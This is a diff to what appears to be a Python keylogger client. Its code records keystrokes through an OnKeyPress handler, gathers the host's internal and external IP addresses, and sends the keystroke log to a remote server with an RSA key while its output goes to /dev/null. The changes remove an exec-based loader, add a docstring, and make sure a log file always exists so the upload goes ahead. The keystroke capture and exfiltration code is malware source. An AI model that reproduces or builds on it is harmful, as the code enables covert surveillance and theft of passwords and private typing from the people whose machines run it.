@@ -110,15 +110,6 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
-def keylog(filepath, globals=None, locals=None):
-    if globals is None:
-        globals = {}
-    globals.update({
-        "__file__": filepath,
-        "__name__": "__main__",
-    })
-    with open(filepath, 'rb') as file:
-        exec(compile(file.read(), filepath, 'exec'), globals, locals)
 
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
@@ -209,6 +200,11 @@ def sendFile(dataFile,  keyLoc, filename):
     chan.close()
     return 0
 def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
+    
+    ''''
+    This function handles the running of the client from start to finish
+    @oarams - standar
+    '''
     cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
     keyLoc = cwd
     keyLoc +=  '/test_rsa.key'
@@ -250,7 +246,13 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
 
     time.sleep(20)
 
-    sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt')
+    #should keylog fail to create a file, make one in its place
+    if not os.path.isfile(cwd+"/loggedKeys.log"):
+         with open(cwd+"/loggedKeys.log", 'a') as f:
+            f.write(".")
+        
+    # path exists
+    sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
     os._exit(0)
     
 # MAIN # 
